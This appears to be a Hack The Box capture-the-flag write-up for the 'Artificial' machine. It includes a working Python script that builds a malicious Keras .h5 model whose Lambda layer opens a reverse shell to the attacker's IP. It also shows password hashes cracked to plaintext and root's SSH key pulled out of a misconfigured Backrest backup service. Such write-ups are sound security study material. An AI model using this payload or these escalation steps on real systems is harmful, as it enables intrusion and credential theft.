Tags: #Linux/Ubuntu #Easy #Nginx #Python #HDF5 #Tensorflow #File-Upload #RCE #Weak-Hashing-Algorithms #Weak-Passwords #Sensitive-Data-Exposure 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.74
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.76 seconds
```
<br>
<br>

# **Service Enumeration**
First look at the site:

![[Pasted image 20250621193951.png]]

Registered account with the creds `test:test` and email "test@example.com"

Dashboard:
![[Pasted image 20250621200654.png]]

* Ran gobuster in vhost mode to discover potential hidden subdomains, no results
* Ran feroxbuster with my session cookie, nothing interesting found except for /upload_model. A 405 Method Not Allowed error is returned when I try to access that page. 

The site seems to take .h5 files, or Hierarchical Data Format 5 files. They're designed to efficiently store and organize large amounts of data and are widely used in data science and machine learning tasks. H5 files can store a variety of data types, including numerical arrays, images, and even custom data structures.
<br>
<br>
# **Exploitation**
## **Initial Access**
Payload script to create malicious h5:

```python
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Lambda, Input
import tensorflow as tf
import numpy as np

model = Sequential([
    Input(shape=(1,)),
    Lambda(lambda x: tf.numpy_function(
        lambda _: __import__('os').system("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'"),
        inp=[x],
        Tout=tf.int64
    ))
])

model.compile()
model.build(input_shape=(None, 1))
model.predict(np.array([[0]]))  # Triggers the payload locally during generation

model.save("exploit.h5")
```

A full explanation can be found on [this post](https://blog.huntr.com/exposing-keras-lambda-exploits-in-tensorflow-models)
Another useful [resource](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model) explaining the same concept

Now logged in as **app**. Current shell was unstable so I created an ssh keypair, dropped the private key to my machine and logged back in with ssh. 

There was a SQLite3 database file called **users.db** in "/home/app/app/instance" that contained creds for a handful of users:

![[Pasted image 20250622121535.png]]

Checking /etc/passwd, we want gael's password:

![[Pasted image 20250622121647.png]]

hashes.com tells us his password is `mattp005numbertwo`. SSH login successful. 
<br>
<br>
# **Privilege Escalation**  
* Gael doesn't have any `sudo` privileges
* Nothing interesting in home directory

Output of `ss -tanup | grep -i listen`:
```
tcp    LISTEN  0       2048         127.0.0.1:5000        0.0.0.0:*             
tcp    LISTEN  0       4096         127.0.0.1:9898        0.0.0.0:*             
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*             
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*             
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*             
tcp    LISTEN  0       511               [::]:80             [::]:*             
tcp    LISTEN  0       128               [::]:22             [::]:*
```

Port 5000 is another instance of the AI web app, nothing interesting there.

Port 9898 is a Backrest instance, which is a WebUI built on top of restic, a backup program that can back up data from any modern OS to various storage locations (local, remote or cloud). 

After port fowarding and logging back in with SSH, we're presented with this at **localhost:9898**:

![[Pasted image 20250622124014.png]]

* `/opt/backrest` is where this program resides on the target machine. No creds were found there
* Process snooping is ineffective due to `hidepid=2` in **/etc/fstab**

**/var/backups** holds a backup of the backrest program in a .tar archive file. Copy to /tmp and extract:

![[Pasted image 20250622132431.png]]

The .config directory contains a config.json file with credentials to the login panel:

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}

```

The username is "backrest_root". The password is hashed with Bcrypt and base64 encoded. Hashcat runs successfully with the rockyou.txt wordlist. The password is `!@#$%^`

![[Pasted image 20250622142638.png]]

The "getting started" guide on the official site tell us to create a repo first, which is where backups will go. Then you create a plan, which tells backrest what to backup and which repo to put it in. 

To get a shell as root, I need root's ssh private key. 

I'll create a directory "backup1" in /tmp and use that path for the repo (password required, so just set it to "nothing"). Then I'll create a backup of /root/.ssh/:

![[Pasted image 20250622144147.png]]

Because of strict permissions and everything being owned by root in /tmp/backup1, I have to run restic commands to view backup contents. The help page will be useful.

`find id_rsa` output:

![[Pasted image 20250622150341.png]]

To print the contents of this file, you use dump with the snapshot id and the file you want, so `dump 357ab5f2 /root/.ssh/id_rsa`:

![[Pasted image 20250622150518.png]]

Copy to your machine, save, set correct permissions, and ssh as root with it. That's it.
<br>
<br>
# Skills Learned
* Slow down, take a step back sometimes and look at what you have, what you've already seen and haven't seen. 
* If you can run commands from within a web app, there's a good chance that's your way through. 
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/668